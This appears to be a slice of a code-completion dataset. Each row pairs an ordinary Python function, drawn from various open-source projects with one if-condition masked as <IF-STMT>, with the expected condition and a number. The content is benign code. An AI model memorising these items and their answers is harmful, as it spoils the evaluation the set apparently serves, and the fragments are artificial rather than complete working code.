2990,"def rsa_public_key_parse(key_material):<tab># These imports take ~.5s; let's keep them local<tab>import sshpubkeys.exceptions<tab>from sshpubkeys.keys import SSHKey<tab>try:<tab><tab><IF-STMT><tab><tab><tab>key_material = key_material.encode(""ascii"")<tab><tab>decoded_key = base64.b64decode(key_material).decode(""ascii"")<tab><tab>public_key = SSHKey(decoded_key)<tab>except (sshpubkeys.exceptions.InvalidKeyException, UnicodeDecodeError):<tab><tab>raise ValueError(""bad key"")<tab>if not public_key.rsa:<tab><tab>raise ValueError(""bad key"")<tab>return public_key.rsa","if not isinstance ( key_material , six . binary_type ) :",174
2991,"def import_type(library, name):<tab>if library.name != idaapi.cvar.idati.name:<tab><tab>last_ordinal = idaapi.get_ordinal_qty(idaapi.cvar.idati)<tab><tab>type_id = idaapi.import_type(library, -1, name)  # tid_t<tab><tab><IF-STMT><tab><tab><tab>return last_ordinal",if type_id != idaapi . BADORD :,106
2992,"def OnDropFiles(self, x, y, files):<tab>filteredList = []<tab>if self.filenameFilter is not None:<tab><tab>for f in files:<tab><tab><tab>for ext in self.filenameFilter:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>filteredList.append(f)<tab>else:<tab><tab>filteredList = files<tab>if len(filteredList) > 0:<tab><tab>self.callback(filteredList)",if f . endswith ( ext ) or f . endswith ( ext . upper ( ) ) :,117
2993,"def _get_most_recent_update(self, versions):<tab>recent = None<tab>for version in versions:<tab><tab>updated = datetime.datetime.strptime(version[""updated""], ""%Y-%m-%dT%H:%M:%SZ"")<tab><tab>if not recent:<tab><tab><tab>recent = updated<tab><tab><IF-STMT><tab><tab><tab>recent = updated<tab>return recent.strftime(""%Y-%m-%dT%H:%M:%SZ"")",elif updated > recent :,103
2994,"def __setstate__(self, servers_ids: List[str]):<tab>self.try_list = []<tab>for server_id in servers_ids:<tab><tab><IF-STMT><tab><tab><tab>self.add_to_try_list(sabnzbd.Downloader.server_dict[server_id])",if server_id in sabnzbd . Downloader . server_dict :,85
2995,"def remove_command(self, command_id):<tab>for command in self.config[""commands""]:<tab><tab><IF-STMT><tab><tab><tab>self.config[""commands""].remove(command)<tab><tab><tab>component.get(""EventManager"").emit(ExecuteCommandRemovedEvent(command_id))<tab><tab><tab>break<tab>self.config.save()",if command [ EXECUTE_ID ] == command_id :,89
2996,"def wrapper(*args, **kargs):<tab>offspring = func(*args, **kargs)<tab>for child in offspring:<tab><tab>for i in xrange(len(child)):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>child[i] = max<tab><tab><tab>elif child[i] < min:<tab><tab><tab><tab>child[i] = min<tab>return offspring",if child [ i ] > max :,95
2997,"def dispatch(self, request, *args, **kwargs):<tab>self.product = get_object_or_404(self.product_model, pk=kwargs[""product_pk""])<tab># check permission to leave review<tab>if not self.product.is_review_permitted(request.user):<tab><tab><IF-STMT><tab><tab><tab>message = _(""You have already reviewed this product!"")<tab><tab>else:<tab><tab><tab>message = _(""You can't leave a review for this product."")<tab><tab>messages.warning(self.request, message)<tab><tab>return redirect(self.product.get_absolute_url())<tab>return super().dispatch(request, *args, **kwargs)",if self . product . has_review_by ( request . user ) :,167
2998,"def PlayPause(self):<tab>state = self.graphManager.GetState(10)<tab>if state == 2:  # playing<tab><tab>self.Pause()<tab>elif state == 1:  # paused<tab><tab>self.Play()<tab>elif state == 0:  # stopped<tab><tab><IF-STMT><tab><tab><tab>self.Stop()<tab><tab><tab>self.PlayingItem = self.SelectedItem<tab><tab><tab>self.LoadFile(self.SelectedItem.Path)<tab><tab><tab>self.Play()<tab><tab>else:<tab><tab><tab>self.Play()<tab>else:<tab><tab>pass  # for now just do nothing<tab>self.NotifyPropertyChanged(""IsPlaying"")<tab>self.NotifyPropertyChanged(""Duration"")",if ( self . SelectedItem != None ) and ( self . filename != self . SelectedItem . Path ) :,188
2999,"def decref(self, *keys):<tab>for tileable_key, tileable_id in keys:<tab><tab>if tileable_key not in self._executed_tileables:<tab><tab><tab>continue<tab><tab>_graph_key, ids = self._executed_tileables[tileable_key]<tab><tab><IF-STMT><tab><tab><tab>ids.remove(tileable_id)<tab><tab><tab># for those same key tileables, do decref only when all those tileables are garbage collected<tab><tab><tab>if len(ids) != 0:<tab><tab><tab><tab>continue<tab><tab><tab>self.delete_data(tileable_key)",if tileable_id in ids :,137
3000,"def get_git_description(self):<tab>if self.is_a_git_repo():<tab><tab>exit_code, stdout, stderr = execute_command_and_capture_output(<tab><tab><tab>""git"", ""describe"", ""--always"", ""--tags"", ""--dirty""<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise PyBuilderException(<tab><tab><tab><tab>""Cannot determine git description: git describe failed:\n{0}"".format(<tab><tab><tab><tab><tab>stderr<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>return stdout.strip()<tab>else:<tab><tab>raise PyBuilderException(<tab><tab><tab>""Cannot determine git description: project is not a git repo.""<tab><tab>)",if exit_code != 0 :,172
3001,"def _code_for_module(self, module):<tab>text = '""%s"" [shape=ellips]' % module.name<tab>for item in list(module.items()):<tab><tab><IF-STMT><tab><tab><tab>text += '\n""%s""' % item<tab><tab><tab>text += '\n""%s"" -> ""%s""' % (module.name, item)<tab><tab>else:<tab><tab><tab>text += self._code_for_module(item)  # recurs<tab><tab><tab>text += '\n""%s"" -> ""%s""' % (module.name, item.name)<tab>return text","if isinstance ( item , str ) :",140
3002,"def test_images_p_is_stochastic_parameter(self):<tab>aug = self.create_aug(p=iap.Choice([0, 1], p=[0.7, 0.3]))<tab>seen = [0, 0]<tab>for _ in sm.xrange(1000):<tab><tab>observed = aug.augment_image(self.image)<tab><tab><IF-STMT><tab><tab><tab>seen[0] += 1<tab><tab>elif np.array_equal(observed, self.image_flipped):<tab><tab><tab>seen[1] += 1<tab><tab>else:<tab><tab><tab>assert False<tab>assert np.allclose(seen, [700, 300], rtol=0, atol=75)","if np . array_equal ( observed , self . image ) :",168
3003,"def get_index_text(self, modname: str, name_cls: Tuple[str, str]) -> str:<tab>if self.objtype == ""function"":<tab><tab><IF-STMT><tab><tab><tab>return _(""%s() (built-in function)"") % name_cls[0]<tab><tab>return _(""%s() (in module %s)"") % (name_cls[0], modname)<tab>elif self.objtype == ""data"":<tab><tab>if not modname:<tab><tab><tab>return _(""%s (built-in variable)"") % name_cls[0]<tab><tab>return _(""%s (in module %s)"") % (name_cls[0], modname)<tab>else:<tab><tab>return """"",if not modname :,162
3004,"def _attributes_to_xml(self, xml_element, prefix_root, debug_context=None):<tab>del debug_context  # Unused.<tab>for attribute_name, attribute in six.iteritems(self._attributes):<tab><tab>attribute_value = attribute.to_xml_string(prefix_root)<tab><tab>if attribute_name == self._spec.identifier and attribute_value is None:<tab><tab><tab>xml_element.set(attribute_name, self.full_identifier)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>xml_element.set(attribute_name, attribute_value)",elif attribute_value is None :,149
3005,def index_def(self):<tab><IF-STMT><tab><tab>self.lazy_init_lock_.acquire()<tab><tab>try:<tab><tab><tab>if self.index_def_ is None:<tab><tab><tab><tab>self.index_def_ = Index()<tab><tab>finally:<tab><tab><tab>self.lazy_init_lock_.release()<tab>return self.index_def_,if self . index_def_ is None :,94
3006,"def _ord_to_str(ordinal, weights):<tab>""""""Reverse function of _str_to_ord.""""""<tab>chars = []<tab>for weight in weights:<tab><tab><IF-STMT><tab><tab><tab>return """".join(chars)<tab><tab>ordinal -= 1<tab><tab>index, ordinal = divmod(ordinal, weight)<tab><tab>chars.append(_ALPHABET[index])<tab>return """".join(chars)",if ordinal == 0 :,97
3007,"def tip_texts(self):<tab>""""""Return the tip texts of the Toolbar (without window text)""""""<tab>texts = []<tab>for i in range(0, self.button_count()):<tab><tab># it works for MFC<tab><tab>btn_tooltip_index = self.get_button_struct(i).iString<tab><tab># usually iString == -1 for separator<tab><tab># other cases if any<tab><tab><IF-STMT><tab><tab><tab>btn_tooltip_index = i<tab><tab>btn_text = self.get_tool_tips_control().get_tip_text(btn_tooltip_index + 1)<tab><tab>texts.append(btn_text)<tab>return texts",if not ( - 1 <= btn_tooltip_index < self . get_tool_tips_control ( ) . tool_count ( ) ) :,183
3008,"def _initCaseSets(self):<tab>self._cs = {}<tab>self._css = {}<tab>for cs in self._caseSets:<tab><tab>if not self._cs.has_key(cs.CaseSetName):<tab><tab><tab>self._cs[cs.CaseSetName] = {}<tab><tab><tab>self._css[cs.CaseSetName] = cs<tab><tab>else:<tab><tab><tab>raise Exception(""duplicate case set name"")<tab><tab>for c in cs.Cases:<tab><tab><tab>idx = tuple(c.index)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._cs[cs.CaseSetName][idx] = c<tab><tab><tab>else:<tab><tab><tab><tab>raise Exception(""duplicate case index"")",if not self . _cs [ cs . CaseSetName ] . has_key ( idx ) :,178
3009,"def is_image(self, input):<tab>try:<tab><tab>if isinstance(input, (np.ndarray, Image.Image)):<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>if not os.path.isfile(input):<tab><tab><tab><tab>raise ValueError(""input must be a file"")<tab><tab><tab>img = Image.open(input)<tab><tab><tab>_ = img.size<tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>return False<tab>except:<tab><tab>return False","elif isinstance ( input , str ) :",122
3010,"def __init__(self, opt, shared=None):<tab>super().__init__(opt, shared)<tab>if not shared:<tab><tab>self.episodes = []<tab><tab>self.num_exs = 0<tab><tab><IF-STMT><tab><tab><tab>self._setup_data(opt.get(""parlaidialogteacher_datafile""))<tab>else:<tab><tab>self.episodes = shared[""episodes""]<tab><tab>self.num_exs = sum(len(e) for e in self.episodes)<tab>self.id = opt[""task""]<tab>self.reset()","if opt . get ( ""parlaidialogteacher_datafile"" ) is not None :",152
3011,"def draw(l, n, th=2):<tab>clear()<tab>l = l * f ** n<tab>shapesize(l / 100.0, l / 100.0, th)<tab>for k in tiledict:<tab><tab>h, x, y = k<tab><tab>setpos(x, y)<tab><tab>setheading(h)<tab><tab><IF-STMT><tab><tab><tab>shape(""kite"")<tab><tab><tab>color(""black"", (0, 0.75, 0))<tab><tab>else:<tab><tab><tab>shape(""dart"")<tab><tab><tab>color(""black"", (0.75, 0, 0))<tab><tab>stamp()",if tiledict [ k ] :,151
3012,"def visit_Assign(self, node):<tab>if len(node.targets) == 1:<tab><tab>if isinstance(node.targets[0], ast.Subscript):<tab><tab><tab>plugPath = self.__plugPath(self.__path(node.targets[0]))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.plugWrites.add(plugPath)<tab>self.visit(node.value)",if plugPath :,93
3013,"def StripTypeInfo(rendered_data):<tab>""""""Strips type information from rendered data. Useful for debugging.""""""<tab>if isinstance(rendered_data, (list, tuple)):<tab><tab>return [StripTypeInfo(d) for d in rendered_data]<tab>elif isinstance(rendered_data, dict):<tab><tab><IF-STMT><tab><tab><tab>return StripTypeInfo(rendered_data[""value""])<tab><tab>else:<tab><tab><tab>result = {}<tab><tab><tab>for k, v in rendered_data.items():<tab><tab><tab><tab>result[k] = StripTypeInfo(v)<tab><tab><tab>return result<tab>else:<tab><tab>return rendered_data","if ""value"" in rendered_data and ""type"" in rendered_data :",159
3014,"def _match_greater_than_or_equal(search_base, attribute, value, candidates):<tab>matches = list()<tab>for entry in candidates:<tab><tab>dn = entry.get(""dn"")<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>value_from_directory = entry.get(""attributes"").get(attribute)<tab><tab>if str(value_from_directory) >= str(value):<tab><tab><tab>entry[""type""] = ""searchResEntry""<tab><tab><tab>matches.append(entry)<tab>return matches",if not dn . endswith ( search_base ) :,129
3015,"def _get_changes(diff):<tab>""""""Get a list of changed versions from git.""""""<tab>changes_dict = {}<tab>for line in diff:<tab><tab>if not line.startswith(""-"") and not line.startswith(""+""):<tab><tab><tab>continue<tab><tab>if line.startswith(""+++ "") or line.startswith(""--- ""):<tab><tab><tab>continue<tab><tab>name, version = parse_versioned_line(line[1:])<tab><tab><IF-STMT><tab><tab><tab>changes_dict[name] = Change(name)<tab><tab>if line.startswith(""-""):<tab><tab><tab>changes_dict[name].old = version<tab><tab>elif line.startswith(""+""):<tab><tab><tab>changes_dict[name].new = version<tab>return [change for _name, change in sorted(changes_dict.items())]",if name not in changes_dict :,181
3016,"def append_row(tbody, cells):<tab>row = nodes.row()<tab>tbody += row<tab>for cell in cells:<tab><tab>entry = nodes.entry()<tab><tab>row += entry<tab><tab><IF-STMT><tab><tab><tab>node = nodes.paragraph(text=cell)<tab><tab>else:<tab><tab><tab>node = cell<tab><tab>entry += node","if isinstance ( cell , six . text_type ) :",91
3017,"def _testdata_to_is_unauthed_access_permitted(tests_config, node_type):<tab>res = []<tab>for x in tests_config[""endpoint_tests""]:<tab><tab>if node_type not in x[""type""]:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>h = x[""tests""][""is_unauthed_access_permitted""]<tab><tab>for p in h[""locations""]:<tab><tab><tab>res.append((p, h.get(""vhost"", None)))<tab>return res","if ""is_unauthed_access_permitted"" not in x [ ""tests"" ] :",139
3018,"def process_ceph_status(output):<tab>res = patternchk.search(output)<tab>if not res:<tab><tab>return {}<tab>ceph_stats = res.group()<tab>if not ceph_stats:<tab><tab>return {}<tab>ret = {}<tab>rd = wr = iops = None<tab>rd = numberchk.search(ceph_stats)<tab>if rd is not None:<tab><tab>ret[""rd""] = rd.group()<tab><tab>wr = numberchk.search(ceph_stats, rd.end())<tab><tab>if wr is not None:<tab><tab><tab>ret[""wr""] = wr.group()<tab><tab><tab>iops = numberchk.search(ceph_stats, wr.end())<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ret[""iops""] = iops.group()<tab>return ret",if iops is not None :,198
3019,"def construct_type_storage_plugin_registry(pipeline_def, system_storage_def):<tab># Needed to avoid circular dep<tab>from dagster.core.definitions import PipelineDefinition, SystemStorageDefinition<tab>check.inst_param(pipeline_def, ""pipeline_def"", PipelineDefinition)<tab>check.inst_param(system_storage_def, ""system_storage_def"", SystemStorageDefinition)<tab>type_plugins = []<tab>for type_obj in pipeline_def.all_runtime_types():<tab><tab>for auto_plugin in type_obj.auto_plugins:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>type_plugins.append((type_obj, auto_plugin))<tab>return TypeStoragePluginRegistry(type_plugins)",if auto_plugin . compatible_with_storage_def ( system_storage_def ) :,185
3020,"def attr(**kw):<tab>kw = kw.items()<tab>kw.sort()<tab>parts = []<tab>for name, value in kw:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if name.endswith(""_""):<tab><tab><tab>name = name[:-1]<tab><tab>parts.append('%s=""%s""' % (html_quote(name), html_quote(value)))<tab>return html("" "".join(parts))",if value is None :,100
3021,"def test_shape():<tab>from lasagne.init import Initializer<tab># Assert that all `Initializer` sublasses return the shape that<tab># we've asked for in `sample`:<tab>for klass in Initializer.__subclasses__():<tab><tab><IF-STMT><tab><tab><tab># check HeNormal, HeUniform, GlorotNormal, GlorotUniform<tab><tab><tab>for sub_klass in klass.__subclasses__():<tab><tab><tab><tab>assert sub_klass().sample((12, 23)).shape == (12, 23)<tab><tab>else:<tab><tab><tab>assert klass().sample((12, 23)).shape == (12, 23)",if len ( klass . __subclasses__ ( ) ) :,144
3022,"def __call__(self, data):<tab>num_points = data.pos.shape[0]<tab>new_data = Data()<tab>for key in data.keys:<tab><tab>if key == KDTREE_KEY:<tab><tab><tab>continue<tab><tab>item = data[key]<tab><tab>if torch.is_tensor(item) and num_points == item.shape[0]:<tab><tab><tab>item = item[self._indices].clone()<tab><tab><IF-STMT><tab><tab><tab>item = item.clone()<tab><tab>setattr(new_data, key, item)<tab>return new_data",elif torch . is_tensor ( item ) :,144
3023,"def vars(self):<tab>ret = []<tab>if op.disklist:<tab><tab>varlist = op.disklist<tab>elif not op.full:<tab><tab>varlist = (""total"",)<tab>else:<tab><tab>varlist = []<tab><tab>for name in self.discover:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>varlist.append(name)<tab><tab>#<tab><tab>   if len(varlist) > 2: varlist = varlist[0:2]<tab><tab>varlist.sort()<tab>for name in varlist:<tab><tab>if name in self.discover + [""total""] or name in op.diskset:<tab><tab><tab>ret.append(name)<tab>return ret",if self . diskfilter . match ( name ) :,182
3024,"def _convertNbBytesinNbBits(self, nbBytes):<tab>nbMinBit = None<tab>nbMaxBit = None<tab>if nbBytes is not None:<tab><tab><IF-STMT><tab><tab><tab>nbMinBit = nbBytes * 8<tab><tab><tab>nbMaxBit = nbMinBit<tab><tab>else:<tab><tab><tab>if nbBytes[0] is not None:<tab><tab><tab><tab>nbMinBit = nbBytes[0] * 8<tab><tab><tab>if nbBytes[1] is not None:<tab><tab><tab><tab>nbMaxBit = nbBytes[1] * 8<tab>return (nbMinBit, nbMaxBit)","if isinstance ( nbBytes , int ) :",149
3025,"def after_test(self, results, tmp_dir):<tab>return_data = dict()<tab>if not results or not results.get(""data""):<tab><tab>return return_data<tab>for filename in results[""data""]:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>with open(filename, ""r"") as f:<tab><tab><tab>log_content = f.read()<tab><tab>log_analyser.make_log_analyses(log_content, return_data)<tab>return return_data","if not has_ext ( filename , "".log"" ) :",125
3026,"def ensure_vm_was_torn_down():<tab>vm_labels = []<tab>for vm_ref in xenapi_fake.get_all(""VM""):<tab><tab>vm_rec = xenapi_fake.get_record(""VM"", vm_ref)<tab><tab><IF-STMT><tab><tab><tab>vm_labels.append(vm_rec[""name_label""])<tab>self.assertEquals(vm_labels, [""1""])","if not vm_rec [ ""is_control_domain"" ] :",110
3027,"def spool_print(*args, **kwargs):<tab>with _print_lock:<tab><tab>if framework.Framework._spool:<tab><tab><tab>framework.Framework._spool.write(f""{args[0]}{os.linesep}"")<tab><tab><tab>framework.Framework._spool.flush()<tab><tab># disable terminal output for server jobs<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab># new print function must still use the old print function via the backup<tab><tab>builtins._print(*args, **kwargs)",if framework . Framework . _mode == Mode . JOB :,126
3028,"def _parse_lines(self, linesource):<tab>""""""Parse lines of text for functions and classes""""""<tab>functions = []<tab>classes = []<tab>for line in linesource:<tab><tab><IF-STMT><tab><tab><tab># exclude private stuff<tab><tab><tab>name = self._get_object_name(line)<tab><tab><tab>if not name.startswith(""_""):<tab><tab><tab><tab>functions.append(name)<tab><tab>elif line.startswith(""class ""):<tab><tab><tab># exclude private stuff<tab><tab><tab>name = self._get_object_name(line)<tab><tab><tab>if not name.startswith(""_""):<tab><tab><tab><tab>classes.append(name)<tab><tab>else:<tab><tab><tab>pass<tab>functions.sort()<tab>classes.sort()<tab>return functions, classes","if line . startswith ( ""def "" ) and line . count ( ""("" ) :",185
3029,"def test_connect_using_sslcontext_verified(self):<tab>with support.transient_internet(self.testServer):<tab><tab>can_verify = check_ssl_verifiy(self.testServer, self.remotePort)<tab><tab><IF-STMT><tab><tab><tab>self.skipTest(""SSL certificate can't be verified"")<tab>support.get_attribute(smtplib, ""SMTP_SSL"")<tab>context = ssl.create_default_context()<tab>with support.transient_internet(self.testServer):<tab><tab>server = smtplib.SMTP_SSL(self.testServer, self.remotePort, context=context)<tab><tab>server.ehlo()<tab><tab>server.quit()",if not can_verify :,163
3030,"def generate_segment_memory(chart_type, race_configs, environment):<tab>structures = []<tab>for race_config in race_configs:<tab><tab><IF-STMT><tab><tab><tab>title = chart_type.format_title(<tab><tab><tab><tab>environment,<tab><tab><tab><tab>race_config.track,<tab><tab><tab><tab>es_license=race_config.es_license,<tab><tab><tab><tab>suffix=""%s-segment-memory"" % race_config.label,<tab><tab><tab>)<tab><tab><tab>chart = chart_type.segment_memory(title, environment, race_config)<tab><tab><tab>if chart:<tab><tab><tab><tab>structures.append(chart)<tab>return structures","if ""segment_memory"" in race_config . charts :",168
3031,"def __iter__(self):<tab>line = b""""<tab>while True:<tab><tab>data = self.read(-1)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>generator = StringIO(data)<tab><tab>assert b""\n"" not in line, line<tab><tab>line += next(generator)<tab><tab>if line.endswith(b""\n""):<tab><tab><tab>yield line<tab><tab><tab>line = b""""<tab><tab><tab>ll = list(generator)<tab><tab><tab>if not ll:<tab><tab><tab><tab>continue<tab><tab><tab>for line in ll[:-1]:<tab><tab><tab><tab>yield line<tab><tab><tab>line = ll[-1]<tab><tab><tab>if line.endswith(b""\n""):<tab><tab><tab><tab>yield line<tab><tab><tab><tab>line = b""""<tab>if line:<tab><tab>yield line",if not data :,189
3032,"def L_op(self, inputs, outputs, gout):<tab>(x,) = inputs<tab>(gz,) = gout<tab>if outputs[0].type in discrete_types:<tab><tab><IF-STMT><tab><tab><tab>return [x.zeros_like(dtype=theano.config.floatX)]<tab><tab>else:<tab><tab><tab>return [x.zeros_like()]<tab>if x.type in float_types:<tab><tab>return (gz * sgn(x),)<tab>return (gz * x / abs(x),)  # formula works for complex and real",if x . type in discrete_types :,133
3033,"def is_ncname(name):<tab>first = name[0]<tab>if first == ""_"" or category(first) in NAME_START_CATEGORIES:<tab><tab>for i in xrange(1, len(name)):<tab><tab><tab>c = name[i]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if c in ALLOWED_NAME_CHARS:<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>return 0<tab><tab><tab># if in compatibility area<tab><tab><tab># if decomposition(c)!='':<tab><tab><tab>#<tab>return 0<tab><tab>return 1<tab>else:<tab><tab>return 0",if not category ( c ) in NAME_CATEGORIES :,151
3034,"def _read_rows_from(self, avro_reader, header):<tab>count = 0<tab>maximum = self.limit if self.limit is not None else sys.maxsize<tab>for i, record in enumerate(avro_reader):<tab><tab>if i < self.skip:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>count += 1<tab><tab>row = self._map_row_from(header, record)<tab><tab>yield row",if count >= maximum :,111
3035,"def decorated(cls, *args, **kwargs):<tab>storage_res = STORAGE_RES_MAPPING[cls.__class__.__name__][func.__name__]<tab>with utils.patch_vnxsystem as patched_vnx:<tab><tab><IF-STMT><tab><tab><tab>patched_vnx.return_value = storage_res[DEFAULT_STORAGE_RES]<tab><tab>adapter = PROTOCOL_MAPPING[protocol](cls.configuration)<tab>return func(cls, adapter, storage_res, *args, **kwargs)",if DEFAULT_STORAGE_RES in storage_res :,122
3036,"def _replace_file(src, dst):<tab>try:<tab><tab><IF-STMT>  # MOVEFILE_REPLACE_EXISTING<tab><tab><tab>raise OSError('Could not replace ""%s"" -> ""%s""' % (src, dst))<tab>except:<tab><tab># Sometimes it fails - we play stupid and try again...<tab><tab>time.sleep(0.5)<tab><tab>if not _MoveFileEx(src, dst, 1):  # MOVEFILE_REPLACE_EXISTING<tab><tab><tab>raise OSError('Could not replace ""%s"" -> ""%s""' % (src, dst))","if not _MoveFileEx ( src , dst , 1 ) :",141
3037,"def read_track_raw(self, redundancy=1):<tab>self._log(""read track raw"")<tab>data = []<tab>await self.lower.write([CMD_READ_RAW, redundancy])<tab>while True:<tab><tab>packet = await self.lower.read()<tab><tab><IF-STMT><tab><tab><tab>raise GlasgowAppletError(""FIFO overflow while reading track"")<tab><tab>elif packet[-1] == 0xFE:<tab><tab><tab>data.append(packet[:-1])<tab><tab><tab>return b"""".join(data)<tab><tab>else:<tab><tab><tab>data.append(packet)",if packet [ - 1 ] == 0xFF :,147
3038,"def get_template_sources(self, template_name, template_dirs=None):<tab>template_name = self.prepare_template_name(template_name)<tab>for loader in self.template_source_loaders:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>for result in loader.get_template_sources(template_name, template_dirs):<tab><tab><tab><tab><tab>yield result<tab><tab><tab>except UnicodeDecodeError:<tab><tab><tab><tab># The template dir name was a bytestring that wasn't valid UTF-8.<tab><tab><tab><tab>raise<tab><tab><tab>except ValueError:<tab><tab><tab><tab># The joined path was located outside of this particular<tab><tab><tab><tab># template_dir (it might be inside another one, so this isn't<tab><tab><tab><tab># fatal).<tab><tab><tab><tab>pass","if hasattr ( loader , ""get_template_sources"" ) :",195
3039,"def __init__(self, reg, shtype, shimm, va):<tab>if shimm == 0:<tab><tab>if shtype == S_ROR:<tab><tab><tab>shtype = S_RRX<tab><tab><IF-STMT><tab><tab><tab>shimm = 32<tab>self.reg = reg<tab>self.shtype = shtype<tab>self.shimm = shimm<tab>self.va = va",elif shtype == S_LSR or shtype == S_ASR :,107
3040,"def pop_many(self, limit=None):<tab>if limit is None:<tab><tab>limit = DEFAULT_SYNC_OFFLINE_ACTIVITY<tab>heartbeats = []<tab>count = 0<tab>while count < limit:<tab><tab>heartbeat = self.pop()<tab><tab>if not heartbeat:<tab><tab><tab>break<tab><tab>heartbeats.append(heartbeat)<tab><tab>count += 1<tab><tab><IF-STMT><tab><tab><tab>yield heartbeats<tab><tab><tab>heartbeats = []<tab>if heartbeats:<tab><tab>yield heartbeats",if count % HEARTBEATS_PER_REQUEST == 0 :,140
3041,"def _set_live(self, live, _):<tab>if live is not None and not self.live:<tab><tab><IF-STMT><tab><tab><tab>live = [live]<tab><tab># Default is to use Memory analysis.<tab><tab>if len(live) == 0:<tab><tab><tab>mode = ""Memory""<tab><tab>elif len(live) == 1:<tab><tab><tab>mode = live[0]<tab><tab>else:<tab><tab><tab>raise RuntimeError(""--live parameter should specify only one mode."")<tab><tab>live_plugin = self.session.plugins.live(mode=mode)<tab><tab>live_plugin.live()<tab><tab># When the session is destroyed, close the live plugin.<tab><tab>self.session.register_flush_hook(self, live_plugin.close)<tab>return live","if isinstance ( live , basestring ) :",184
3042,"def capture_output(redirect_stderr=True):<tab>oldout, olderr = sys.stdout, sys.stderr<tab>try:<tab><tab>out = StringIO()<tab><tab>sys.stdout = out<tab><tab><IF-STMT><tab><tab><tab>sys.stderr = out<tab><tab>else:<tab><tab><tab>sys.stderr = StringIO()<tab><tab>yield out<tab>except:<tab><tab>if redirect_stderr:<tab><tab><tab>traceback.print_exc()<tab><tab>else:<tab><tab><tab>raise<tab>finally:<tab><tab>sys.stdout, sys.stderr = oldout, olderr",if redirect_stderr :,135
3043,"def run(self):<tab>self.mpd.connect()<tab>events = [""player""]<tab>while True:<tab><tab>if ""player"" in events:<tab><tab><tab>status = self.mpd.status()<tab><tab><tab>handler = getattr(self, ""on_"" + status[""state""], None)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>handler(status)<tab><tab><tab>else:<tab><tab><tab><tab>self._log.debug(u'unhandled status ""{0}""', status)<tab><tab>events = self.mpd.events()",if handler :,121
3044,"def get_full_qualified_name(self, node: Element) -> str:<tab>if node.get(""reftype"") == ""option"":<tab><tab>progname = node.get(""std:program"")<tab><tab>command = ws_re.split(node.get(""reftarget""))<tab><tab><IF-STMT><tab><tab><tab>command.insert(0, progname)<tab><tab>option = command.pop()<tab><tab>if command:<tab><tab><tab>return ""."".join([""-"".join(command), option])<tab><tab>else:<tab><tab><tab>return None<tab>else:<tab><tab>return None",if progname :,133
3045,"def _get_sources(self):<tab>servers = self.config[""servers""]<tab>""""""maps urls to extractors""""""<tab>server_links = {<tab><tab>""mp4upload"": ""mp4upload.com"",<tab><tab>""gcloud"": ""gcloud.live"",<tab><tab>""gcloud"": ""fembed.com"",<tab>}<tab>soup = helpers.soupify(helpers.get(self.url)).select(""iframe"")<tab>for a in servers:<tab><tab>for b in soup:<tab><tab><tab>for c in server_links:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return [(c, b.get(""src""))]<tab>logger.warn(""Unsupported URL"")<tab>return """"","if server_links [ c ] in b . get ( ""src"" ) and a == c :",179
3046,"def _self_set(self, context):<tab>if self.keys is not None:<tab><tab>return<tab>new_dict = context.get_pynames([""self"", ""d""])[1]<tab>if new_dict and isinstance(new_dict.get_object().get_type(), Dict):<tab><tab>args = arguments.ObjectArguments([new_dict])<tab><tab>items = new_dict.get_object()[""popitem""].get_object().get_returned_object(args)<tab><tab>context.save_per_name(items)<tab>else:<tab><tab>holding = _infer_sequence_for_pyname(new_dict)<tab><tab><IF-STMT><tab><tab><tab>context.save_per_name(holding)","if holding is not None and isinstance ( holding . get_type ( ) , Tuple ) :",181
3047,"def create():<tab>""""""Create a new post for the current user.""""""<tab>if request.method == ""POST"":<tab><tab>title = request.form[""title""]<tab><tab>body = request.form[""body""]<tab><tab>error = None<tab><tab><IF-STMT><tab><tab><tab>error = ""Title is required.""<tab><tab>if error is not None:<tab><tab><tab>flash(error)<tab><tab>else:<tab><tab><tab>db.session.add(Post(title=title, body=body, author=g.user))<tab><tab><tab>db.session.commit()<tab><tab><tab>return redirect(url_for(""blog.index""))<tab>return render_template(""blog/create.html"")",if not title :,158
3048,"def _find_host_dir_ldconfig(self, arch=""x86-64""):<tab>""""""Find host nvidia libraries via ldconfig""""""<tab>dir_list = set()<tab>ld_data = Uprocess().get_output([""ldconfig"", ""-p""])<tab>if ld_data:<tab><tab>regexp = ""[ |\t]%s[^ ]* .*%s.*=> (/.*)""<tab><tab>for line in ld_data.split(""\n""):<tab><tab><tab>for lib in self._nvidia_main_libs:<tab><tab><tab><tab>match = re.search(regexp % (lib, arch), line)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>dir_list.add(<tab><tab><tab><tab><tab><tab>os.path.realpath(os.path.dirname(match.group(1))) + ""/""<tab><tab><tab><tab><tab>)<tab>return dir_list",if match :,196
